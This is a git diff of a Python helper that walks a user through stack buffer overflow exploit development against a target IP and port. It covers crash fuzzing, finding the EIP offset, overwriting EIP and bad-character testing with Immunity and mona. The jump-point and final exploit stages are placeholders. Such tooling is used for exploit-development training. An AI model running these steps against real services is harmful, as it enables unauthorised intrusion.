@@ -1,6 +1,6 @@
 #!/bin/python
 
-# Acarine v0.4.2
+# Acarine v0.4.3
 
 # Usage: 
     # Acarine.py -t [IP] -p [PORT]
@@ -120,7 +120,7 @@ sure we can overwrite the EIP.\n
 The next step will send 5000 'A' characters to the target ('41' in hex).
 Upon execution, make sure to check the value of the EIP in Immunity (which should 
 be '41414141' if successful)\n
-Make sure the program you are testing is now LOADED and RUNNING in Immunity.\n""")
+Make sure the program you are testing is now {color.PURPLE}LOADED and RUNNING{color.END} in Immunity.\n""")
     aCharsInput = input(f"{color.GREEN}[ENTER] to Continue, OR enter number to send: {color.END}")
     menuCheck(aCharsInput)
     if aCharsInput == "":
@@ -146,7 +146,7 @@ def offsetTest():
 This section is to find the exact location of the EIP and its offset.\n
 To do this we will be sending a pattern of 5000 characters, where upon noting what numbers appear in the EIP
 we can then find the exact offset.\n
-Make sure to RE-LOAD and RE-RUN the program you are testing in Immunity.\n""")
+Make sure to {color.PURPLE}RE-LOAD and RE-RUN{color.END} the program you are testing in Immunity.\n""")
     patternInput = input(f"{color.GREEN}[ENTER] to Continue, OR enter number to send: {color.END}")
     menuCheck(patternInput)
     if patternInput == "":
@@ -183,7 +183,7 @@ Make sure to RE-LOAD and RE-RUN the program you are testing in Immunity.\n""")
     print(f"""Now we need to test whether we are on target and have indeed successfully discovered the offset.\n
 We will now send a payload of Four 'B' characters ('42424242' in hex) with our offset of {offset}.
 If we are successful the EIP will read '42424242' as these 'B' should land exactly.\n
-Again, make sure to RE-LOAD and RE-RUN the program you are testing in Immunity.\n""")
+Again, make sure to {color.PURPLE}RE-LOAD and RE-RUN{color.END} the program you are testing in Immunity.\n""")
     BCharTest = input(f"{color.GREEN}[ENTER] to Continue: {color.END}")
     menuCheck(BCharTest)
     offsetLoad = "A" * offset + "B" * 4
@@ -238,7 +238,7 @@ we are testing has any {color.BOLD}Bad Characters{color.END} that need to be eli
     ## Tells how to make first byte array
     print(f"\nFirst we need to generate a byte array. This will be used to determine any Bad Characters.\n")
     print(rf'To generate a byte array in Immunity enter "{color.YELLOW}!mona bytearray -b "\x00"{color.END}"')
-    print(f"""\nAgain, make sure to {color.BOLD}RE-LOAD and RE-RUN{color.END} the program you are testing in Immunity.\n
+    print(f"""\nAgain, make sure to {color.PURPLE}RE-LOAD and RE-RUN{color.END} the program you are testing in Immunity.\n
 When ready, a payload of characters will be sent to the target program.\n""")
     ## Test 1: w/o user input:
     charsInitialInput = input(f"{color.GREEN}[ENTER] to Continue: {color.END}")
@@ -251,7 +251,7 @@ Please note:
     [*] The '00' byte has {color.BOLD}already been excluded{color.END} from the byte array, so {color.BOLD}do not{color.END} enter this as a result.
     [*] If two bytes follow each other (e.g. '0a 0b','19 1a', etc) {color.BOLD}only enter the first byte listed{color.END}, as the second may be a false positive.
         If the second byte continues to show as a positive in subsequent testing, then please include it.\n
-After making note of the bad character(s), make sure you {color.BOLD}RE-LOAD and RE-RUN{color.END} your target program before continuing.""")
+After making note of the bad character(s), make sure you {color.PURPLE}RE-LOAD and RE-RUN{color.END} your target program before continuing.""")
     # Test 2: w/ user input:
     charsResultInput = input(f"\n{color.GREEN}Enter bad characters seperated by spaces, and press [ENTER] to continue.\nOR, if 'Status' header returns 'Unmodified' press [ENTER]: {color.END}")
     badCharsExec(charsResultInput)
@@ -261,15 +261,17 @@ After making note of the bad character(s), make sure you {color.BOLD}RE-LOAD and
         newCharsResultInput = input(f"\n{color.GREEN}If 'Status' header now returns 'Unmodified' press [ENTER] (or enter remaining BadChars): {color.END}")
         if newCharsResultInput != "":
             badCharsExec(newCharsResultInput)
-        elif newCharsResultInput == "":
+        else:
             break
+    print("\nNow that we have successfully discovered all the Bad Characters in the test program we will move onto Finding the Jump Point.\n")
     jumpPointTest()
 
 # [4] Finding the Jump Point:
 
 def jumpPointTest():
     print("Jump Point Placeholder")
-    print(badChars)
+    offsetAvailble()
+    # print(badChars)
     sys.exit()
 
 # [5] Final Buffer Overflow Exploit:
@@ -278,7 +280,7 @@ def exploitBuffer():
     print("Exploit Placeholder")
     sys.exit()
 
-# [!] Init:
+# [!] Main:
 
 parser = argparse.ArgumentParser()
 parser.add_argument('-t','-T','--target',help="target IP")#,default=socket.gethostname())
